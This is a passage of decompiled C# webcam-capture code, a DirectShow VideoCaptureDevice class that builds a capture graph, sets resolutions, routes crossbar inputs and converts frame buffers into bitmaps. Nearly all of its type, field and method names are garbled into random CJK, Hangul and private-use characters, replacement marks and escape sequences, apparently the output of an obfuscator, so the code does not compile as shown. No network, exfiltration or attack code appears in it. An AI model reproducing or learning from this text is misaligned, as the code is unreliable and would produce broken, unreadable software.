        雏潃䏼냈ᚎ琢涶矏þ㸊禳䪚뗢갦㥿4.SetOneShot(false);
        雏潃䏼냈ᚎ琢涶矏þ㸊禳䪚뗢갦㥿4.SetCallback((㪍ᛕ虄\u3221ﾨᨋ뮽盦ᘕ뢒\uA7E4\uF824\uFFFD娭羊ꊂ䚩ⵝႨ뤏) callback2, 1);
        this.GetPinCapabilitiesAndConfigureSizeAndRate(graphBuilder1, 鼦硗ꉪﭛ湏瘊䦽㓾ﭺ㯷램缨婾ꇦ渙4, ꑵ䃣苝塽亳刿\u2B69\uEAA5\u26DA䈴醣敨꽾췩菱䯯\u0E70\uFFFD왠덯.\uF862䜥륖礒\u0ACE緙\uFFFD駖๗\u00B6\uE781䁛㔍ﰯ㚂뾐服\u29A8옖잿, this.videoResolution, ref this.videoCapabilities);
        if (flag)
          this.GetPinCapabilitiesAndConfigureSizeAndRate(graphBuilder1, 鼦硗ꉪﭛ湏瘊䦽㓾ﭺ㯷램缨婾ꇦ渙4, ꑵ䃣苝塽亳刿\u2B69\uEAA5\u26DA䈴醣敨꽾췩菱䯯\u0E70\uFFFD왠덯.蚰ꩼԷힿ늝旷穃\uE625谍혏籲㯺遉אּ뮩㘯쫓ퟁ岕鲆, this.snapshotResolution, ref this.snapshotCapabilities);
        else
          this.snapshotCapabilities = new 뗦邔沖逌僋䌛\uEE2F궍\uFFE0팰鋔\uF0D6ᄲ\uFFFD䳲惽ဃ\uE6A3ḧ售[0];
        lock (VideoCaptureDevice.cacheVideoCapabilities)
        {
          if (this.videoCapabilities != null)
          {
            if (!VideoCaptureDevice.cacheVideoCapabilities.ContainsKey(this.deviceMoniker))
              VideoCaptureDevice.cacheVideoCapabilities.Add(this.deviceMoniker, this.videoCapabilities);
          }
        }
        lock (VideoCaptureDevice.cacheSnapshotCapabilities)
        {
          if (this.snapshotCapabilities != null)
          {
            if (!VideoCaptureDevice.cacheSnapshotCapabilities.ContainsKey(this.deviceMoniker))
              VideoCaptureDevice.cacheSnapshotCapabilities.Add(this.deviceMoniker, this.snapshotCapabilities);
          }
        }
        if (runGraph)
        {
          graphBuilder1.RenderStream(ꑵ䃣苝塽亳刿\u2B69\uEAA5\u26DA䈴醣敨꽾췩菱䯯\u0E70\uFFFD왠덯.\uF862䜥륖礒\u0ACE緙\uFFFD駖๗\u00B6\uE781䁛㔍ﰯ㚂뾐服\u29A8옖잿, \uE15A䤑ӷꞭ俎ᢝ뾪榐\uEEA8\uE92E茋\uF2C1\uF7CF\uE90C\uF335㿂ᇍ贔윳긠.ꐌꔕ䰣\uAA5A\uF13B恣䆯ꉱ鬋뮼\uEA64ᴵ鐰\uFFFD聋ኝ㻐\uFFC0븂鉶, (object) 鼦硗ꉪﭛ湏瘊䦽㓾ﭺ㯷램缨婾ꇦ渙4, (鼦硗ꉪﭛ湏瘊䦽\uF630\uE04D㓾ﭺ㯷\u2F74램缨婾\u1C88ꇦ渙\uE355) null, 鼦硗ꉪﭛ湏瘊䦽㓾ﭺ㯷램缨婾ꇦ渙5);
          if (雏潃䏼냈ᚎ琢涶矏þ㸊禳䪚뗢갦㥿3.GetConnectedMediaType(mediaType) == 0)
          {
            \u2304ꃦ츔\uFFFD֢笫㜌炙\uFFFD䝉씦덉\u0E7B︧ホֻ玮ྪ蔫䣎 structure = (\u2304ꃦ츔\uFFFD֢笫㜌炙\uFFFD䝉씦덉\u0E7B︧ホֻ玮ྪ蔫䣎) Marshal.PtrToStructure(mediaType.FormatPtr, typeof (\u2304ꃦ츔\uFFFD֢笫㜌炙\uFFFD䝉씦덉\u0E7B︧ホֻ玮ྪ蔫䣎));
            callback1.Width = structure.\u23C9\uF7F3ꉜ啸쉢Ь迡퐏ݡᄜ꽲ȍ펰\u0B52垚ꑔ鱎쏅鹳洈.\u1DEF\uE0E5\uE531ꑲ꼺킹집펇Ꝯ䶃\uFAE5页崞裶ಈ䕅奉ṽ\uF338\u2925;
            callback1.Height = structure.\u23C9\uF7F3ꉜ啸쉢Ь迡퐏ݡᄜ꽲ȍ펰\u0B52垚ꑔ鱎쏅鹳洈.\uFFFDꪌ\uE6B0ﯪ弗ꭗ還ୁ좵氽턐媕瞶Ⱌ\u29F3弣蛸⃛R\u218E;
            mediaType.Dispose();
          }
          if (flag && this.provideSnapshots)
          {
            graphBuilder1.RenderStream(ꑵ䃣苝塽亳刿\u2B69\uEAA5\u26DA䈴醣敨꽾췩菱䯯\u0E70\uFFFD왠덯.蚰ꩼԷힿ늝旷穃\uE625谍혏籲㯺遉אּ뮩㘯쫓ퟁ岕鲆, \uE15A䤑ӷꞭ俎ᢝ뾪榐\uEEA8\uE92E茋\uF2C1\uF7CF\uE90C\uF335㿂ᇍ贔윳긠.ꐌꔕ䰣\uAA5A\uF13B恣䆯ꉱ鬋뮼\uEA64ᴵ鐰\uFFFD聋ኝ㻐\uFFC0븂鉶, (object) 鼦硗ꉪﭛ湏瘊䦽㓾ﭺ㯷램缨婾ꇦ渙4, (鼦硗ꉪﭛ湏瘊䦽\uF630\uE04D㓾ﭺ㯷\u2F74램缨婾\u1C88ꇦ渙\uE355) null, 鼦硗ꉪﭛ湏瘊䦽㓾ﭺ㯷램缨婾ꇦ渙6);
            if (雏潃䏼냈ᚎ琢涶矏þ㸊禳䪚뗢갦㥿4.GetConnectedMediaType(mediaType) == 0)
            {
              \u2304ꃦ츔\uFFFD֢笫㜌炙\uFFFD䝉씦덉\u0E7B︧ホֻ玮ྪ蔫䣎 structure = (\u2304ꃦ츔\uFFFD֢笫㜌炙\uFFFD䝉씦덉\u0E7B︧ホֻ玮ྪ蔫䣎) Marshal.PtrToStructure(mediaType.FormatPtr, typeof (\u2304ꃦ츔\uFFFD֢笫㜌炙\uFFFD䝉씦덉\u0E7B︧ホֻ玮ྪ蔫䣎));
              callback2.Width = structure.\u23C9\uF7F3ꉜ啸쉢Ь迡퐏ݡᄜ꽲ȍ펰\u0B52垚ꑔ鱎쏅鹳洈.\u1DEF\uE0E5\uE531ꑲ꼺킹집펇Ꝯ䶃\uFAE5页崞裶ಈ䕅奉ṽ\uF338\u2925;
              callback2.Height = structure.\u23C9\uF7F3ꉜ啸쉢Ь迡퐏ݡᄜ꽲ȍ펰\u0B52垚ꑔ鱎쏅鹳洈.\uFFFDꪌ\uE6B0ﯪ弗ꭗ還ୁ좵氽턐媕瞶Ⱌ\u29F3弣蛸⃛R\u218E;
              mediaType.Dispose();
            }
          }
          範蒂柆懭댵藪\uE158덇뫽쭧즉\uE34E\u0383뺱ጪഥፀಡ쵮뒌 範蒂柆懭댵藪덇뫽쭧즉뺱ጪഥፀಡ쵮뒌2 = (範蒂柆懭댵藪\uE158덇뫽쭧즉\uE34E\u0383뺱ጪഥፀಡ쵮뒌) o2;
          ὧ\u228A\u2B9B픝瓃下㺱歐ꈬ犂\uF559褺\u337F崡\uE4EE陵\u0F3D楄ꁏ\uE32E ὧ픝瓃下㺱歐ꈬ犂褺崡陵楄ꁏ2 = (ὧ\u228A\u2B9B픝瓃下㺱歐ꈬ犂\uF559褺\u337F崡\uE4EE陵\u0F3D楄ꁏ\uE32E) o2;
          範蒂柆懭댵藪덇뫽쭧즉뺱ጪഥፀಡ쵮뒌2.Run();
          if (flag && this.provideSnapshots)
          {
            this.startTime = DateTime.Now;
            懨鶧鲹嫴檇ꗥ潒㤖镜嗍ꘫ㜷洶鱪.SetMode(pin, 찂\uE54C\u33D7ഁ䥺䞬뭍슌\uF46C㽹ᶱᜱ㡖堄\uE50B䉋䑙韃\u227A\u12C7.襵Ү冿\uE924懙榪\uF5C1췽ኳ\u2BC5뛙㮿퍣奫䵎岟\u2CE6ꭇ懖\uEB8F);
          }
          do
          {
            \u055E\u0095헃\uF876簔굠㢻\uFFFD팉晭謣㨹諃\uF52E\uE798遢嘴衣\uE1E1삨 lEventCode;
            IntPtr lParam1;
            IntPtr lParam2;
            if (ὧ픝瓃下㺱歐ꈬ犂褺崡陵楄ꁏ2 != null && ὧ픝瓃下㺱歐ꈬ犂褺崡陵楄ꁏ2.GetEvent(out lEventCode, out lParam1, out lParam2, 0) >= 0)
            {
              ὧ픝瓃下㺱歐ꈬ犂褺崡陵楄ꁏ2.FreeEventParams(lEventCode, lParam1, lParam2);
              if (lEventCode == \u055E\u0095헃\uF876簔굠㢻\uFFFD팉晭謣㨹諃\uF52E\uE798遢嘴衣\uE1E1삨.\uE04E䭱訌㳈綩\u1B7D\uFFFD芧隥\uFFFD\u27D4폪꺔\uF514彲\uFE41૫\uEF38좹쐊)
              {
                reason = \u9FE7覀鈳Ᵹᖋ퇐쐩\u2103ￕ毢蛠뮅궀诿賶뷃屇\u00A2\uF724뫀.磌膦款ꗎ漮ꌝ㴯鮳䃖㒏뫰纞忮擊힍旛㵥\u2733䴧옘;
                break;
              }
            }
            if (this.needToSetVideoInput)
            {
              this.needToSetVideoInput = false;
              if (this.isCrossbarAvailable.Value)
              {
                this.SetCurrentCrossbarInput(ሙﶶ掝䢗礤䱳걖콐勍铧뚟ᜊဤ챖瘼냥갡, this.crossbarVideoInput);
                this.crossbarVideoInput = this.GetCurrentCrossbarInput(ሙﶶ掝䢗礤䱳걖콐勍铧뚟ᜊဤ챖瘼냥갡);
              }
            }
            if (this.needToSimulateTrigger)
            {
              this.needToSimulateTrigger = false;
              if (flag && this.provideSnapshots)
                懨鶧鲹嫴檇ꗥ潒㤖镜嗍ꘫ㜷洶鱪.SetMode(pin, 찂\uE54C\u33D7ഁ䥺䞬뭍슌\uF46C㽹ᶱᜱ㡖堄\uE50B䉋䑙韃\u227A\u12C7.擰䘍\u26A1\uFFFD泭\u3362읛娏题淎ꯨ从\uF10Aﮍ僋\u283A㦽戲浜\u33BA);
            }
            if (this.needToDisplayPropertyPage)
            {
              this.needToDisplayPropertyPage = false;
              this.DisplayPropertyPage(this.parentWindowForPropertyPage, this.sourceObject);
              if (ሙﶶ掝䢗礤䱳걖콐勍铧뚟ᜊဤ챖瘼냥갡 != null)
                this.crossbarVideoInput = this.GetCurrentCrossbarInput(ሙﶶ掝䢗礤䱳걖콐勍铧뚟ᜊဤ챖瘼냥갡);
            }
            if (this.needToDisplayCrossBarPropertyPage)
            {
              this.needToDisplayCrossBarPropertyPage = false;
              if (ሙﶶ掝䢗礤䱳걖콐勍铧뚟ᜊဤ챖瘼냥갡 != null)
              {
                this.DisplayPropertyPage(this.parentWindowForPropertyPage, (object) ሙﶶ掝䢗礤䱳걖콐勍铧뚟ᜊဤ챖瘼냥갡);
                this.crossbarVideoInput = this.GetCurrentCrossbarInput(ሙﶶ掝䢗礤䱳걖콐勍铧뚟ᜊဤ챖瘼냥갡);
              }
            }
          }
          while (!this.stopEvent.WaitOne(100, false));
          範蒂柆懭댵藪덇뫽쭧즉뺱ጪഥፀಡ쵮뒌2.Stop();
        }
      }
      catch (Exception ex)
      {
        if (this.VideoSourceError != null)
          this.VideoSourceError((object) this, new \uFFFDꕃ\uEF22裢받߀檍\uFFFD쩕㮉Җ녓\u0EEC렌汈曤기\u242Eⷸ媨(ex.Message));
      }
      finally
      {
        塲ꩴ䲘钌Ⰾ噅ឩ攕Ⅾ筌땄鷭嶰늀ᖩ渕 = (塲ꩴ䲘\uF8E8钌Ⰾ噅\uFFFDឩ攕\u02C2ⅾ筌땄\uF510鷭嶰늀ᖩ渕) null;
        캤銬椱峭㚼ⴖ꺾ᢉ鴰慈뱄ꗏ = (\u0A0C캤銬椱\u2FF5\uFFFD\uE562峭\uAB1D㚼ⴖ\uFFFD\uFFFD꺾ᢉ\uEE96鴰慈뱄ꗏ) null;
        鼦硗ꉪﭛ湏瘊䦽㓾ﭺ㯷램缨婾ꇦ渙1 = (鼦硗ꉪﭛ湏瘊䦽\uF630\uE04D㓾ﭺ㯷\u2F74램缨婾\u1C88ꇦ渙\uE355) null;
        範蒂柆懭댵藪덇뫽쭧즉뺱ጪഥፀಡ쵮뒌1 = (範蒂柆懭댵藪\uE158덇뫽쭧즉\uE34E\u0383뺱ጪഥፀಡ쵮뒌) null;
        ὧ픝瓃下㺱歐ꈬ犂褺崡陵楄ꁏ1 = (ὧ\u228A\u2B9B픝瓃下㺱歐ꈬ犂\uF559褺\u337F崡\uE4EE陵\u0F3D楄ꁏ\uE32E) null;
        鼦硗ꉪﭛ湏瘊䦽㓾ﭺ㯷램缨婾ꇦ渙2 = (鼦硗ꉪﭛ湏瘊䦽\uF630\uE04D㓾ﭺ㯷\u2F74램缨婾\u1C88ꇦ渙\uE355) null;
        鼦硗ꉪﭛ湏瘊䦽㓾ﭺ㯷램缨婾ꇦ渙3 = (鼦硗ꉪﭛ湏瘊䦽\uF630\uE04D㓾ﭺ㯷\u2F74램缨婾\u1C88ꇦ渙\uE355) null;
        雏潃䏼냈ᚎ琢涶矏þ㸊禳䪚뗢갦㥿1 = (雏潃䏼냈ᚎ琢\u25BB涶矏þ㸊禳䪚뗢\uD8CF\uDC61갦\u3241㥿\uFFFD) null;
        雏潃䏼냈ᚎ琢涶矏þ㸊禳䪚뗢갦㥿2 = (雏潃䏼냈ᚎ琢\u25BB涶矏þ㸊禳䪚뗢\uD8CF\uDC61갦\u3241㥿\uFFFD) null;
        if (o2 != null)
          Marshal.ReleaseComObject(o2);
        if (this.sourceObject != null)
        {
          Marshal.ReleaseComObject(this.sourceObject);
          this.sourceObject = (object) null;
        }
        if (o3 != null)
          Marshal.ReleaseComObject(o3);
        if (o4 != null)
          Marshal.ReleaseComObject(o4);
        if (o1 != null)
          Marshal.ReleaseComObject(o1);
        if (retInterface != null)
          Marshal.ReleaseComObject(retInterface);
      }
      if (this.PlayingFinished == null)
        return;
      this.PlayingFinished((object) this, reason);
    }

    private void SetResolution(
      ᡤ전꺏葧촩\uEF21ሰ튝血\uF442鄚᧘幚\uF71F龥顷\u3388듴ᓍブ streamConfig,
      뗦邔沖逌僋䌛\uEE2F궍\uFFE0팰鋔\uF0D6ᄲ\uFFFD䳲惽ဃ\uE6A3ḧ售 resolution)
    {
      if (뗦邔沖逌僋䌛\uEE2F궍\uFFE0팰鋔\uF0D6ᄲ\uFFFD䳲惽ဃ\uE6A3ḧ售.\u25F4퐓\uF5B5\u2729넨㦤벽膉\uFFFD嬁밨놫곇\u2A7E咦ꐲ熾옟ʯ郼(resolution, (뗦邔沖逌僋䌛\uEE2F궍\uFFE0팰鋔\uF0D6ᄲ\uFFFD䳲惽ဃ\uE6A3ḧ售) null))
        return;
      int count = 0;
      int size = 0;
      AMMediaType mediaType = (AMMediaType) null;
      곎\uF071屠匨꿗\u21BC缵ﵷ\uF830呤갖ٶᑉ햁\uF47E鵙긠沕\u2FA6ᔵ streamConfigCaps = new 곎\uF071屠匨꿗\u21BC缵ﵷ\uF830呤갖ٶᑉ햁\uF47E鵙긠沕\u2FA6ᔵ();
      streamConfig.GetNumberOfCapabilities(out count, out size);
      for (int index = 0; index < count; ++index)
      {
        try
        {
          뗦邔沖逌僋䌛\uEE2F궍\uFFE0팰鋔\uF0D6ᄲ\uFFFD䳲惽ဃ\uE6A3ḧ售 b = new 뗦邔沖逌僋䌛\uEE2F궍\uFFE0팰鋔\uF0D6ᄲ\uFFFD䳲惽ဃ\uE6A3ḧ售(streamConfig, index);
          if (뗦邔沖逌僋䌛\uEE2F궍\uFFE0팰鋔\uF0D6ᄲ\uFFFD䳲惽ဃ\uE6A3ḧ售.\u25F4퐓\uF5B5\u2729넨㦤벽膉\uFFFD嬁밨놫곇\u2A7E咦ꐲ熾옟ʯ郼(resolution, b))
          {
            if (streamConfig.GetStreamCaps(index, out mediaType, streamConfigCaps) == 0)
              break;
          }
        }
        catch
        {
        }
      }
      if (mediaType == null)
        return;
      streamConfig.SetFormat(mediaType);
      mediaType.Dispose();
    }

    private void GetPinCapabilitiesAndConfigureSizeAndRate(
      塲ꩴ䲘\uF8E8钌Ⰾ噅\uFFFDឩ攕\u02C2ⅾ筌땄\uF510鷭嶰늀ᖩ渕 graphBuilder,
      鼦硗ꉪﭛ湏瘊䦽\uF630\uE04D㓾ﭺ㯷\u2F74램缨婾\u1C88ꇦ渙\uE355 baseFilter,
      Guid pinCategory,
      뗦邔沖逌僋䌛\uEE2F궍\uFFE0팰鋔\uF0D6ᄲ\uFFFD䳲惽ဃ\uE6A3ḧ售 resolutionToSet,
      ref 뗦邔沖逌僋䌛\uEE2F궍\uFFE0팰鋔\uF0D6ᄲ\uFFFD䳲惽ဃ\uE6A3ḧ售[] capabilities)
    {
      object retInterface;
      graphBuilder.FindInterface(pinCategory, \uE15A䤑ӷꞭ俎ᢝ뾪榐\uEEA8\uE92E茋\uF2C1\uF7CF\uE90C\uF335㿂ᇍ贔윳긠.ꐌꔕ䰣\uAA5A\uF13B恣䆯ꉱ鬋뮼\uEA64ᴵ鐰\uFFFD聋ኝ㻐\uFFC0븂鉶, baseFilter, typeof (ᡤ전꺏葧촩\uEF21ሰ튝血\uF442鄚᧘幚\uF71F龥顷\u3388듴ᓍブ).GUID, out retInterface);
      if (retInterface != null)
      {
        ᡤ전꺏葧촩\uEF21ሰ튝血\uF442鄚᧘幚\uF71F龥顷\u3388듴ᓍブ ᡤ전꺏葧촩ሰ튝血鄚᧘幚龥顷듴ᓍブ = (ᡤ전꺏葧촩\uEF21ሰ튝血\uF442鄚᧘幚\uF71F龥顷\u3388듴ᓍブ) null;
        try
        {
          ᡤ전꺏葧촩ሰ튝血鄚᧘幚龥顷듴ᓍブ = (ᡤ전꺏葧촩\uEF21ሰ튝血\uF442鄚᧘幚\uF71F龥顷\u3388듴ᓍブ) retInterface;
        }
        catch (InvalidCastException ex)
        {
        }
        if (ᡤ전꺏葧촩ሰ튝血鄚᧘幚龥顷듴ᓍブ != null)
        {
          if (capabilities == null)
          {
            try
            {
              capabilities = 뗦邔沖逌僋䌛\uEE2F궍\uFFE0팰鋔\uF0D6ᄲ\uFFFD䳲惽ဃ\uE6A3ḧ售.\u0B7B칦厽\uFFFD戣\uF2C8㖽뗱䜰袅藆冶썦籌ⱀ\uFFFD车牂\uED65缹(ᡤ전꺏葧촩ሰ튝血鄚᧘幚龥顷듴ᓍブ);
            }
            catch
            {
            }
          }
          if (뗦邔沖逌僋䌛\uEE2F궍\uFFE0팰鋔\uF0D6ᄲ\uFFFD䳲惽ဃ\uE6A3ḧ售.\u23E8뿵ꃲꅝ\uF5AFᆳⵎ\u058B\uF7C7赈渵멃챪쀩㖁ꓩ\uFFFD䤇\u27C0ﳔ(resolutionToSet, (뗦邔沖逌僋䌛\uEE2F궍\uFFE0팰鋔\uF0D6ᄲ\uFFFD䳲惽ဃ\uE6A3ḧ售) null))
            this.SetResolution(ᡤ전꺏葧촩ሰ튝血鄚᧘幚龥顷듴ᓍブ, resolutionToSet);
        }
      }
      if (capabilities != null)
        return;
      capabilities = new 뗦邔沖逌僋䌛\uEE2F궍\uFFE0팰鋔\uF0D6ᄲ\uFFFD䳲惽ဃ\uE6A3ḧ售[0];
    }

    private void DisplayPropertyPage(IntPtr parentWindow, object sourceObject)
    {
      try
      {
        \u187F劊䵁儐ힿꢂ墥घ\uF122\u1737\u2696\u2BA4䈍댹\uE057浾\uF160㗟㼻䑐 pPages;
        ((\uEC01Ⲩ鶉\u3193惔ᶰ똶\uED9C걻뜙\uFFFD턢\uF286\uFFFD紙椥獽쪛뿤惴) sourceObject).GetPages(out pPages);
        FilterInfo filterInfo = new FilterInfo(this.deviceMoniker);
        叐ᗜᵠ\u0AC6䜕ᤘᗥǞ뗽獮펽롹髁譾꣯㜙圵\uEF25쩂돷.\uF2B1\uF2E1\uEB7F铍\uAA5A\u0A3Dᚅ뫒粑次\u2BA7륻睺䙯惘\u2A4AẲ\u2A57졨ꋯ(parentWindow, 0, 0, filterInfo.Name, 1, ref sourceObject, pPages.\uE261ᴵ鼏곫缇狳ꁠ䨯㑡鴲ﬕｊ㽂䡓㚆陂\uEA84㲪馭㓱, pPages.䆤ꯡﳉ\uEB02\u2A7F欭ꠥＫ啱\uF355੬殪끅參뭋䒏\uFFFD㕜쪩鮱, 0, 0, IntPtr.Zero);
        Marshal.FreeCoTaskMem(pPages.䆤ꯡﳉ\uEB02\u2A7F欭ꠥＫ啱\uF355੬殪끅參뭋䒏\uFFFD㕜쪩鮱);
      }
      catch
      {
      }
    }

    private 䛍䠔舫鬳\uF39C\u2320\uFFFD眄෬\u2642챧펷ኲᬑ\uF72F䖉겭韝蠢귉[] ColletCrossbarVideoInputs(
      ሙﶶ掝䢗礤䱳\uF19B걖콐勍铧뚟ᜊဤ챖瘼냥갡\u237B\u2125 crossbar)
    {
      lock (VideoCaptureDevice.cacheCrossbarVideoInputs)
      {
        if (VideoCaptureDevice.cacheCrossbarVideoInputs.ContainsKey(this.deviceMoniker))
          return VideoCaptureDevice.cacheCrossbarVideoInputs[this.deviceMoniker];
        List<䛍䠔舫鬳\uF39C\u2320\uFFFD眄෬\u2642챧펷ኲᬑ\uF72F䖉겭韝蠢귉> 䛍䠔舫鬳眄෬챧펷ኲᬑ䖉겭韝蠢귉List = new List<䛍䠔舫鬳\uF39C\u2320\uFFFD眄෬\u2642챧펷ኲᬑ\uF72F䖉겭韝蠢귉>();
        int inputPinCount;
        if (crossbar != null && crossbar.get_PinCounts(out int _, out inputPinCount) == 0)
        {
          for (int index = 0; index < inputPinCount; ++index)
          {
            鏫㦔矤牌䓋纞ၪ閯욛靣᳭浉悉赠\uA4C7庰뙃︣ꚗ籈 physicalType;
            if (crossbar.get_CrossbarPinInfo(true, index, out int _, out physicalType) == 0 && physicalType < 鏫㦔矤牌䓋纞ၪ閯욛靣᳭浉悉赠\uA4C7庰뙃︣ꚗ籈.鼥㒍爂\u3036싮觽ḟጠӋ\uF33B䆹욽呸얾왴\uE85D䒼잉搪\uE406)
              䛍䠔舫鬳眄෬챧펷ኲᬑ䖉겭韝蠢귉List.Add(new 䛍䠔舫鬳\uF39C\u2320\uFFFD眄෬\u2642챧펷ኲᬑ\uF72F䖉겭韝蠢귉(index, physicalType));
          }
        }
        䛍䠔舫鬳\uF39C\u2320\uFFFD眄෬\u2642챧펷ኲᬑ\uF72F䖉겭韝蠢귉[] array = new 䛍䠔舫鬳\uF39C\u2320\uFFFD眄෬\u2642챧펷ኲᬑ\uF72F䖉겭韝蠢귉[䛍䠔舫鬳眄෬챧펷ኲᬑ䖉겭韝蠢귉List.Count];
        䛍䠔舫鬳眄෬챧펷ኲᬑ䖉겭韝蠢귉List.CopyTo(array);
        VideoCaptureDevice.cacheCrossbarVideoInputs.Add(this.deviceMoniker, array);
        return array;
      }
    }

    private 䛍䠔舫鬳\uF39C\u2320\uFFFD眄෬\u2642챧펷ኲᬑ\uF72F䖉겭韝蠢귉 GetCurrentCrossbarInput(
      ሙﶶ掝䢗礤䱳\uF19B걖콐勍铧뚟ᜊဤ챖瘼냥갡\u237B\u2125 crossbar)
    {
      䛍䠔舫鬳\uF39C\u2320\uFFFD眄෬\u2642챧펷ኲᬑ\uF72F䖉겭韝蠢귉 currentCrossbarInput = 䛍䠔舫鬳\uF39C\u2320\uFFFD眄෬\u2642챧펷ኲᬑ\uF72F䖉겭韝蠢귉.Default;
      int outputPinCount;
      if (crossbar.get_PinCounts(out outputPinCount, out int _) == 0)
      {
        int outputPinIndex = -1;
        int pinIndexRelated;
        for (int pinIndex = 0; pinIndex < outputPinCount; ++pinIndex)
        {
          鏫㦔矤牌䓋纞ၪ閯욛靣᳭浉悉赠\uA4C7庰뙃︣ꚗ籈 physicalType;
          if (crossbar.get_CrossbarPinInfo(false, pinIndex, out pinIndexRelated, out physicalType) == 0 && physicalType == 鏫㦔矤牌䓋纞ၪ閯욛靣᳭浉悉赠\uA4C7庰뙃︣ꚗ籈.ƣݚ닸砯\uFFFD\uE34E\u2247۲璂㵀\u31EEꠙ㻠矅ᅵퟩ\u088E\uEC5A\u27BB忧)
          {
            outputPinIndex = pinIndex;
            break;
          }
        }
        int inputPinIndex;
        if (outputPinIndex != -1 && crossbar.get_IsRoutedTo(outputPinIndex, out inputPinIndex) == 0)
        {
          鏫㦔矤牌䓋纞ၪ閯욛靣᳭浉悉赠\uA4C7庰뙃︣ꚗ籈 physicalType;
          crossbar.get_CrossbarPinInfo(true, inputPinIndex, out pinIndexRelated, out physicalType);
          currentCrossbarInput = new 䛍䠔舫鬳\uF39C\u2320\uFFFD眄෬\u2642챧펷ኲᬑ\uF72F䖉겭韝蠢귉(inputPinIndex, physicalType);
        }
      }
      return currentCrossbarInput;
    }

    private void SetCurrentCrossbarInput(
      ሙﶶ掝䢗礤䱳\uF19B걖콐勍铧뚟ᜊဤ챖瘼냥갡\u237B\u2125 crossbar,
      䛍䠔舫鬳\uF39C\u2320\uFFFD眄෬\u2642챧펷ኲᬑ\uF72F䖉겭韝蠢귉 videoInput)
    {
      int outputPinCount;
      int inputPinCount;
      if (videoInput.㻰쳨֯\uFFFD㢛뎁慊㐴\uFFFD\uEA62敼튠ᬎ甊튢߫癛ꄸ뚒\u25A5 == 鏫㦔矤牌䓋纞ၪ閯욛靣᳭浉悉赠\uA4C7庰뙃︣ꚗ籈.ﵼ茗\uF7A7쨧ꍊ倿뺪貖\uA95D뵨ᝓŝ\uEC19瞯瞕\u0E8E膂ώ铠ꘜ || crossbar.get_PinCounts(out outputPinCount, out inputPinCount) != 0)
        return;
      int outputPinIndex = -1;
      int inputPinIndex = -1;
      int pinIndexRelated;
      鏫㦔矤牌䓋纞ၪ閯욛靣᳭浉悉赠\uA4C7庰뙃︣ꚗ籈 physicalType;
      for (int pinIndex = 0; pinIndex < outputPinCount; ++pinIndex)
      {
        if (crossbar.get_CrossbarPinInfo(false, pinIndex, out pinIndexRelated, out physicalType) == 0 && physicalType == 鏫㦔矤牌䓋纞ၪ閯욛靣᳭浉悉赠\uA4C7庰뙃︣ꚗ籈.ƣݚ닸砯\uFFFD\uE34E\u2247۲璂㵀\u31EEꠙ㻠矅ᅵퟩ\u088E\uEC5A\u27BB忧)
        {
          outputPinIndex = pinIndex;
          break;
        }
      }
      for (int pinIndex = 0; pinIndex < inputPinCount; ++pinIndex)
      {
        if (crossbar.get_CrossbarPinInfo(true, pinIndex, out pinIndexRelated, out physicalType) == 0 && physicalType == videoInput.㻰쳨֯\uFFFD㢛뎁慊㐴\uFFFD\uEA62敼튠ᬎ甊튢߫癛ꄸ뚒\u25A5 && pinIndex == videoInput.觘嗍ⱔ쌯\u21A0㾝㚄\u1CB3咫䰥᧕ľ\uA7EB憰䊿攭ѕÌ쐾櫼)
        {
          inputPinIndex = pinIndex;
          break;
        }
      }
      if (inputPinIndex == -1 || outputPinIndex == -1 || crossbar.CanRoute(outputPinIndex, inputPinIndex) != 0)
        return;
      crossbar.Route(outputPinIndex, inputPinIndex);
    }

    private void OnNewFrame(Bitmap image)
    {
      ++this.framesReceived;
      this.bytesReceived += (long) (image.Width * image.Height * (Image.GetPixelFormatSize(image.PixelFormat) >> 3));
      if (this.stopEvent.WaitOne(0, false) || this.NewFrame == null)
        return;
      this.NewFrame((object) this, new 科վሺ辛ힻ\uFFFD鼺Ύ뉄馣욹\uE421〩丢〫관\uE652蠟楨䬙(image));
    }

    private void OnSnapshotFrame(Bitmap image)
    {
      if ((DateTime.Now - this.startTime).TotalSeconds < 4.0 || this.stopEvent.WaitOne(0, false) || this.SnapshotFrame == null)
        return;
      this.SnapshotFrame((object) this, new 科վሺ辛ힻ\uFFFD鼺Ύ뉄馣욹\uE421〩丢〫관\uE652蠟楨䬙(image));
    }

    private class Grabber : 㪍ᛕ虄\u3221ﾨᨋ뮽盦ᘕ뢒\uA7E4\uF824\uFFFD娭羊ꊂ䚩ⵝႨ뤏
    {
      private VideoCaptureDevice parent;
      private bool snapshotMode;
      private int width;
      private int height;

      public int Width
      {
        get => this.width;
        set => this.width = value;
      }

      public int Height
      {
        get => this.height;
        set => this.height = value;
      }

      public Grabber(VideoCaptureDevice parent, bool snapshotMode)
      {
        this.parent = parent;
        this.snapshotMode = snapshotMode;
      }

      public int SampleCB(double sampleTime, IntPtr sample) => 0;

      public unsafe int BufferCB(double sampleTime, IntPtr buffer, int bufferLen)
      {
        if (this.parent.NewFrame != null)
        {
          Bitmap image = new Bitmap(this.width, this.height, PixelFormat.Format24bppRgb);
          BitmapData bitmapdata = image.LockBits(new Rectangle(0, 0, this.width, this.height), ImageLockMode.ReadWrite, PixelFormat.Format24bppRgb);
          int stride1 = bitmapdata.Stride;
          int stride2 = bitmapdata.Stride;
          byte* dst = (byte*) ((IntPtr) bitmapdata.Scan0.ToPointer() + stride2 * (this.height - 1));
          byte* pointer = (byte*) buffer.ToPointer();
          for (int index = 0; index < this.height; ++index)
          {
            叐ᗜᵠ\u0AC6䜕ᤘᗥǞ뗽獮펽롹髁譾꣯㜙圵\uEF25쩂돷.縉摁渧ㇵ\uFFFD㲓㞺缒\u1A8E㴻\uFFFD짟\u2EE8\u29E5韄໗肌\u290A鎱籧(dst, pointer, stride1);
            dst -= stride2;
            pointer += stride1;
          }
          image.UnlockBits(bitmapdata);
          if (this.snapshotMode)
            this.parent.OnSnapshotFrame(image);
          else
            this.parent.OnNewFrame(image);
          image.Dispose();
        }
        return 0;
      }
    }
  }
}
